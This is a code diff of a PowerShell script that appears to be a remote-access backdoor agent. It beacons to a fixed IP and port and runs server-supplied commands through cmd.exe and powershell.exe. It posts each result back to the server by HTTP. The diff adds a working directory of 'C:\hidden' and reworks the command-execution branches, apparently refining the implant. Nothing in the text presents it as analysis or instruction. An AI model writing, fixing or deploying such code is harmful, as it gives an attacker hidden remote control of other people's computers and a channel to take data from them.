@@ -1,3 +1,5 @@
+Set-Location -Path "C:\hidden"
+
 $ip = "192.168.165.127"
 $port = "5000"
 $sleeptime = 10
@@ -37,16 +39,16 @@ for (;;) {
             exit
         }
         elseif ($command -eq "shell"){
-            $arg = "/c "
-            foreach ($a in $args){ $arg += $a + " "}
-            $res = cmd $arg
+            $arg  = ""
+            foreach ($a in $args){ $arg += $a + " " }
+            $res  = cmd.exe /c "$arg"
             $data = @{result = "$res"}
             (Invoke-WebRequest -UseBasicParsing -Uri $resulturl -Body $data -Method 'POST')
         }
         elseif ($command -eq "powershell"){
             $arg = ""
             foreach ($a in $args){ $arg += $a + " "}
-            $res = powershell $arg
+            $res = powershell.exe "$arg"
             $data = @{result = "$res"}
             (Invoke-WebRequest -UseBasicParsing -Uri $resulturl -Body $data -Method 'POST')
         }
